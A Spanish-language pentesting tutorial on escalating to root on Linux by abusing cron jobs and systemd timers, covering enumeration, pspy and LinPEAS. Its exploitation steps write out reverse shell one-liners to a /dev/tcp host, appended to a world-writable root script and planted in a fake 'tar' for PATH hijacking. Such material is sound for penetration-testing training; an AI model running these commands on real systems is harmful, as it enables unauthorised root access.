# **Auditoría Maestra de Tareas Programadas en Linux para Pentesting**

En el ciclo de vida de un pentest, la fase de post-explotación es donde se forjan las victorias más significativas. Una vez dentro de un sistema, el objetivo primordial es la **escalada de privilegios**, y no hay un camino más directo y frecuentemente explotable que el abuso de tareas programadas. Los administradores, en su afán por automatizar, a menudo dejan tras de sí un rastro de configuraciones débiles que un atacante puede seguir hasta obtener acceso `root`.

Esta guía proporciona una metodología exhaustiva para identificar y explotar debilidades en todo el espectro de planificadores de tareas de Linux.

## **Parte 1: El Planificador Clásico y Omnipresente: `cron`**

`cron` es el caballo de batalla de la automatización en Linux. Su simplicidad es también su debilidad. Una auditoría de `cron` debe ser metódica y completa.

### **Paso 1.1: Mapear el Ecosistema `cron`**

Las tareas no residen en un solo lugar. Se debe inspeccionar cada uno de los siguientes archivos y directorios.

#### **A. El `crontab` del Sistema (`/etc/crontab`)**

Es el archivo de configuración central. Define las tareas a nivel de sistema y, crucialmente, la variable de entorno `PATH` por defecto que usarán las tareas.

**Comando de Inspección:**

```bash
cat /etc/crontab
```

**Ejemplo de Salida y Puntos de Interés:**

```ini
SHELL=/bin/sh
# La variable PATH es crítica. Si incluye directorios escribibles como /tmp,
# se abre la puerta al secuestro de PATH.
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 * * * * root    cd / && run-parts --report /etc/cron.hourly
# ... otras líneas ...

# TAREA PERSONALIZADA SOSPECHOSA: Se ejecuta cada minuto como root.
# Este es un objetivo de alta prioridad.
* * * * * root    /opt/scripts/backup.sh
```

#### **B. Los Directorios `cron.d` y `cron.*`**

Estos directorios permiten una gestión modular de las tareas.

  * `/etc/cron.d/`: Contiene archivos de configuración de `cron` para aplicaciones específicas.
  * `/etc/cron.{hourly,daily,weekly,monthly}/`: Contienen scripts ejecutables.

**Comandos de Inspección:**

```bash
# Inspeccionar el directorio cron.d
ls -l /etc/cron.d/
cat /etc/cron.d/apache2

# Inspeccionar los scripts diarios y sus permisos
ls -l /etc/cron.daily/
```

### **Paso 1.2: Vectores de Explotación de `cron`**

#### **Vector A: Secuestro de Script por Permisos de Escritura (El más directo)**

**Escenario**: Se descubre una tarea de `root` que ejecuta un script sobre el que tenemos permisos de escritura.

**1. Descubrimiento (del `/etc/crontab`):**
`* * * * * root /usr/local/bin/maintenance.sh`

**2. Verificación de Permisos:**

```bash
ls -l /usr/local/bin/maintenance.sh
```

**Salida Vulnerable:**

```
-rwxr-xrwx 1 root root 58 Aug  5 20:10 /usr/local/bin/maintenance.sh
```

*El bit de escritura (`w`) para "otros" (`world`) es la luz verde.*

**3. Explotación (Inyección de Reverse Shell):**

```bash
# Se añade el payload al final del script sin borrar su contenido original
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"' >> /usr/local/bin/maintenance.sh
```

Se inicia un listener (`nc -lvnp 4444`) y se espera a que el reloj marque el siguiente minuto para recibir una shell como `root`.

#### **Vector B: Abuso de la Variable `PATH`**

**Escenario**: Una tarea de `root` ejecuta un comando sin su ruta absoluta, y el `PATH` definido en `/etc/crontab` incluye un directorio que controlamos.

**1. Descubrimiento:**

  * `/etc/crontab` contiene: `PATH=/usr/bin:/bin:/home/user/tools`
  * El script `/usr/local/bin/compress.sh` (ejecutado por `root`) contiene la línea: `tar czf /backups/data.tgz /data`

**2. Explotación (Creación de un Falso `tar`):**
Como controlamos `/home/user/tools`, que está en el `PATH`, creamos nuestro propio `tar`.

```bash
# Crear el ejecutable malicioso
echo '#!/bin/bash' > /home/user/tools/tar
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"' >> /home/user/tools/tar

# Darle permisos de ejecución
chmod +x /home/user/tools/tar
```

Cuando `cron` ejecute el script, buscará `tar` en el `PATH`, encontrará nuestra versión maliciosa primero y nos dará una shell de `root`.

-----

## **Parte 2: El Planificador Moderno: `systemd Timers`**

`systemd` ha reemplazado a `cron` en muchos sistemas modernos. Su mecanismo de "timers" es más complejo pero igualmente explotable.

### **Paso 2.1: Mapear los Timers de `systemd`**

Una tarea en `systemd` tiene dos componentes: un archivo `.timer` (el "cuándo") y un archivo `.service` (el "qué").

**Comando de Enumeración Central:**

```bash
systemctl list-timers --all
```

**Ejemplo de Salida y Puntos de Interés:**

```
NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES
Wed 2025-08-06 00:00:00 CEST  5h 53min left Tue 2025-08-05 00:00:00 CEST  18h ago      logrotate.timer              logrotate.service
Wed 2025-08-06 06:21:24 CEST  12h left      Tue 2025-08-05 17:51:24 CEST  30min ago    apt-daily.timer              apt-daily.service
n/a                         n/a           n/a                         n/a          backup.timer                 backup.service
```

*La columna `ACTIVATES` nos dice qué servicio se ejecuta. `backup.timer` parece una tarea personalizada y, por tanto, un objetivo prioritario.*

### **Paso 2.2: Explotación de `systemd Timers`**

La metodología es idéntica a la de `cron`.

**1. Inspeccionar el Servicio:**
Se debe encontrar y leer el archivo de la unidad de servicio para saber qué comando ejecuta.

```bash
# Encontrar la ubicación del archivo de servicio
systemctl status backup.service

# Leer el archivo de servicio
cat /etc/systemd/system/backup.service
```

**Ejemplo de Archivo de Servicio Vulnerable:**

```ini
[Unit]
Description=Servicio de backup personalizado

[Service]
# Esta línea es nuestro objetivo. ¿Qué ejecuta y con qué permisos?
ExecStart=/bin/sh -c "/usr/local/bin/sync_files.sh"
User=root

[Install]
WantedBy=multi-user.target
```

*El `User=root` confirma que es un vector de escalada.*

**2. Verificar Permisos y Explotar:**
Se aplican los mismos vectores: se comprueban los permisos del script (`/usr/local/bin/sync_files.sh`) y de su directorio. Si se encuentra una debilidad, se inyecta el payload como se describió para `cron`.

-----

## **Parte 3: Herramientas del Arsenal para la Automatización**

La enumeración manual es precisa, pero lenta. Estas herramientas aceleran el proceso drásticamente.

### **`pspy`: El Espía de Procesos**

`pspy` es una herramienta que se ejecuta sin privilegios y monitoriza el sistema para registrar cualquier proceso que se inicie. Es la mejor manera de descubrir tareas `cron` sin tener que leer ningún archivo.

**Ejecución:**

```bash
./pspy64
```

**Salida Relevante:**
`pspy` imprimirá en tiempo real cualquier comando ejecutado por `cron`, mostrando el `UID` con el que se ejecuta, el `PID` y el comando completo.

```
2025/08/05 18:30:01 CMD: UID=0    PID=12345  | /usr/sbin/CRON -f
2025/08/05 18:30:01 CMD: UID=0    PID=12346  | /bin/sh -c /opt/scripts/backup.sh
```

*Esta salida nos dice instantáneamente que `root` (UID=0) está ejecutando `/opt/scripts/backup.sh`.*

### **`LinPEAS`: El Enumerador Automático**

`LinPEAS` es el script de enumeración por excelencia. Al ejecutarlo, tiene secciones específicas que buscan y resaltan con colores las configuraciones de tareas programadas potencialmente vulnerables, incluyendo `cron` y `systemd timers` con permisos débiles. Es el primer script que se debe ejecutar en cualquier máquina Linux comprometida.